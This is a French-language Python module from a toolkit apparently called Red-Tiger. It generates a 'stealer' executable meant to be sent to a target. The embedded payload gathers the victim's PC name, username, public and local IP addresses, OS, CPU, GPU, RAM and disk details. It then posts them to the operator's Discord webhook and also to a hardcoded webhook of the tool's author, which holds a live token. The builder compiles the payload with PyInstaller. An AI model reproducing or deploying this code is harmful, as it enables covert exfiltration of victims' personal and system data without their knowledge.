from Options.Options import *

import os
import subprocess
import time

TitrePage("Stealer Create")
LAPprint(f"{couleur.RED}\nLe stealer vous donne les informations du PC qui lance le .exe\nIl y a seulement vous qui voyez les informations de la personne grâce à votre Webhook.")
LAPprint(f"{couleur.RED}\nInformations que vous récuperer:")
LAPprint(f"""{couleur.YELLOW}- Ip: Local, Publique, ipv4, ipv6
- Info Pc: Composant, Nom, Plateforme, Périphérique
- Et bien plus ! """)
LAPprint(f"{couleur.RED}\nMettez votre Webhook, laissez l'installation se faire, puis envoyez-le à votre cible !")
webhook = input(f"\n{couleur.RED}Entre le lien de ton Webhook -> {couleur.RESET}")
LAPprint(f"{couleur.RED}\nConversion en fichier exécutable (.exe):{couleur.RESET}")


fichier_texte = './Programmes/Programmes/StealerCreate/StealerCreate.txt'

fichier_python = './Programmes/Programmes/StealerCreate/StealerCreate.py'

chemin_destination = "./03-Stealer-Create"

chemin_destination_spec = './Programmes/Programmes/StealerCreate'

with open(fichier_texte, 'w') as fichier:
 fichier.write('''import socket
import requests
import json
import os
import platform
import requests
import ctypes
from screeninfo import get_monitors
import psutil
import GPUtil


#Recuperation du nom du pc
try:
 nom_pc = socket.gethostname()
except:
 nom_pc = "N/A"

try:
 nom_utilisateur = os.getlogin()
except:
 nom_utilisateur = "N/A"

#Recuperation de l'IP Publique
try:
 response = requests.get('https://httpbin.org/ip')
        
 ip_address_public = response.json()['origin']

except:
 ip_address_public = "N/A"

#Recuperation de l'IP Local
try:
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(('8.8.8.8', 80))

 ip_address_local = s.getsockname()[0]

 s.close()
except:
 ip_address_local = "N/A"


#Recuperation de l'IP Ipv4
try:
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(('8.8.8.8', 80))  

 ip_address_ipv4 = s.getsockname()[0]
 s.close()
except:
 ip_address_ipv4 = "N/A"


#Recuperation de l'IP Ipv6
try:
 s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
 s.connect(('2001:4860:4860::8888', 80))

 ip_address_ipv6 = s.getsockname()[0]
except:
 ip_address_ipv6 = "N/A"

#Recuperation de son systeme d'exploitation
try:
 system_info = {platform.system()}
 system_version_info = platform.version()
except:
 system_info = "N/A"
 system_version_info = "N/A"

#Recuperation des RAM
try:
 ram_info = round(psutil.virtual_memory().total / (1024**3), 2)
except:
 ram_info = "N/A"

#Recuperation du processeur et des coeur
try:
 cpu_info = platform.processor()
 cpu_coeur_info = psutil.cpu_count(logical=False)
except:
 cpu_info = "N/A"
 cpu_coeur_info = "N/A"

#Recuperation de la carte graphique
try:
 gpus = GPUtil.getGPUs()
 gpu_info = gpus[0].name if gpus else "N/A"
except:
 gpu_info = "N/A"


#Recuperation info disque
try:
 disk_info = psutil.disk_usage(path='/')

 espace_disque = round(disk_info.total / (1024**3), 2)
 espace_utilise_disque = round(disk_info.used / (1024**3), 2)
 espace_dispo_disque = round(disk_info.free / (1024**3), 2)
except:
 disk_info = "N/A"
 espace_disque = "N/A"
 espace_utilise_disque = "N/A"
 espace_dispo_disque = "N/A"

#Lettre disque dur
try:
 repertoire_courant = os.getcwd()

 lettre_lecteur = os.path.splitdrive(repertoire_courant)[0]
except:
 lettre_lecteur = "N/A"


#Recuperer portable ou fix
try:
 def is_portable():
    try:
        battery = psutil.sensors_battery()
        return battery is not None and battery.power_plugged is not None
    except AttributeError:
        return False

 if is_portable():
    plateforme_info = 'Pc Portable'
 else:
    plateforme_info = 'Pc Fixe'
except:
 plateforme_info = "N/A"


#Recuperer les info ECRAN PRINCIPAL:
try:
 def get_resolution():
    hdc = ctypes.windll.user32.GetDC(0)
    width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
    height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
    ctypes.windll.user32.ReleaseDC(0, hdc)
    return width, height

 for i, monitor in enumerate(get_monitors(), 1):
    if monitor.is_primary:
        width, height = get_resolution()
        name = monitor.name
        is_primary = 'Oui'

 principal_ecran = f"""Nom             : "{name}" 
Resolution      : "{width}x{height}"
Ecran Principal : "{is_primary}"
"""
except:
 principal_ecran = "N/A"

#Recuperer info ECRAN SECONDAIRE
try:
 def get_resolution():
    hdc = ctypes.windll.user32.GetDC(0)
    width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
    height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
    ctypes.windll.user32.ReleaseDC(0, hdc)
    return width, height


 monitors = list(get_monitors())

 if len(monitors) > 1:

    second_monitor = monitors[1]

    width, height = get_resolution()

    second_ecran =  f"""Nom             : "{second_monitor.name}" 
Resolution      : "{width}x{height}"
Ecran Principal : "Non"
"""
 else:
   second_ecran = 'N/A'
except:
 second_ecran = "N/A"

''')
 fichier.write(f'''
webhook_invit = '{webhook}'
''')
 fichier.write('''
def send_embed(webhook_url, title, color=0xf00020):

    embed_data = {
        'title': title,
        "fields": fields,
        'color': color,
        "author": author,
        "footer": footer
    }


    data = {
        'embeds': [embed_data],
        'username': username,  
        'avatar_url': avatar_url 
    }


    json_data = json.dumps(data)


    headers = {
        'Content-Type': 'application/json'
    }


    response = requests.post(webhook_url, data=json_data, headers=headers)

embed_title = f'Red-Tiger | Info "{nom_pc}"'

fields = [
    {"name": f"User Pc:", "value": f"""```Nom      : "{nom_pc}"
Username : "{nom_utilisateur}"```""", "inline": False},

    {"name": f"Systeme:", "value": f"""```Plateforme   : "{plateforme_info}"
Exploitation : "{system_info} {system_version_info}"

CPU : "{cpu_info} {cpu_coeur_info} Coeur"
GPU : "{gpu_info}"
RAM : "{ram_info}Go"```""", "inline": False},

{"name": f"Ip:", "value": f"""```Publique : "{ip_address_public}"
Local    : "{ip_address_local}"
Ipv4     : "{ip_address_ipv4}"
Ipv6     : "{ip_address_ipv6}"```""", "inline": False},

{"name": f"Disque:", "value": f"""```Drive      : "{lettre_lecteur}/Users/{nom_utilisateur}/"

Total      : "{espace_disque}Go"
Utilise    : "{espace_utilise_disque}Go"
Disponible : "{espace_dispo_disque}Go"```""", "inline": False},

{"name": f"Peripherique:", "value": f"""```Ecran Principal:
{principal_ecran}

Ecran Secondaire:
{second_ecran}```""", "inline": False},

{"name": f"Webhook Utilise:", "value": f"""```{webhook_invit}```""", "inline": False},
#{"name": f"", "value": f"""```{}```""", "inline": False},
] 

author =  {
        "name": "Red-Tiger | Stealer Create",
        "url": "https://github.com/fluzzzy/RedTiger-Fluzypro",
        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
          }

footer = {
        "text": "Red-Tiger",
        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
        }

embed_color = 0xf00020

username = 'Red-Tiger'
avatar_url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'

webhook_url = 'https://discord.com/api/webhooks/1182817593564872795/0VJ0v0mmjTDCcbzOYMxihCB9XvXMqGax1ccaoaHWj6Qdc4aE3Cm3PvDE0EffHVreKlPk'

send_embed(webhook_url, embed_title, embed_color)
send_embed(webhook_invit, embed_title, embed_color)
''')
 
nom_module = 'requests'
try:
 subprocess.check_call(['pip', 'install', nom_module])
except:
   print("")

nom_module = 'auto-py-to-exe'
try:
 subprocess.check_call(['pip', 'install', nom_module])
except:
   print("")

nom_module = 'pyinstaller'
try:
 subprocess.check_call(['pip', 'install', nom_module])
except:
   print("")

nom_module = 'socket'
try:
 subprocess.check_call(['pip', 'install', nom_module])
except:
   print("")

nom_module = 'platform'
try:
 subprocess.check_call(['pip', 'install', nom_module])
except:
   print("")

nom_module = 'psutil'
try:
 subprocess.check_call(['pip', 'install', nom_module])
except:
   print("")

nom_module = 'screeninfo'
try:
 subprocess.check_call(['pip', 'install', nom_module])
except:
   print("")

nom_module = 'GPUtil'
try:
 subprocess.check_call(['pip', 'install', nom_module])
except:
   print("")

with open(fichier_texte, 'r') as fichier_txt:

    contenu = fichier_txt.read()

with open(fichier_python, 'w') as fichier_py:

    fichier_py.write(contenu)

with open(fichier_texte, 'w') as fichier:
 fichier.write(f"{chemin_destination}")

def convert_to_exe(script_name, destination_path):
    try:
        script_path = os.path.abspath(script_name)

        if not os.path.exists(destination_path):
            os.makedirs(destination_path)

        subprocess.run(['pyinstaller', '--onefile', '--distpath', destination_path, script_path])

        print(f"Conversion réussie. L'exécutable se trouve dans le dossier '{destination_path}'.")
    except Exception as e:
        print(f"Erreur lors de la conversion : {e}")

convert_to_exe(fichier_python, chemin_destination)

print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Le fichier {couleur.CYAN}\"StealerCreate\"{couleur.LIGHTRED_EX} a était créé.", couleur.RESET)
time.sleep(5)
print(f"\n{couleur.RED}Chemin de \"StealerCreate\": {couleur.CYAN}\"{chemin_destination}\"{couleur.RED}, vous pouvez le renommer, déplacer comme vous voulez !", couleur.RESET)
time.sleep(8)
Reset()